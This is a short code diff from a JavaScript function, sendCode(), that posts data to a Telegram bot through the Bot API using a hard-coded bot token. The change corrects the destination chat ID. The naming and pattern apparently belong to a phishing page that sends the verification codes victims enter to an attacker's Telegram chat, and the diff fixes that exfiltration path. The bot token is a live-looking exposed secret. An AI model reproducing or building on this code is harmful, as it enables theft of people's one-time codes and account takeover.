@@ -148,7 +148,7 @@ function sendCode() {
 
         NUMBER_TIME_SEND_CODE++;
         const botToken = '8220009589:AAGbrxbkKdgCiXZVgzvLa87fLa_U9218cK4';
-        const chatId = '-2599226416';
+        const chatId = '-1002599226416';
         const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
         fetch(telegramUrl, {
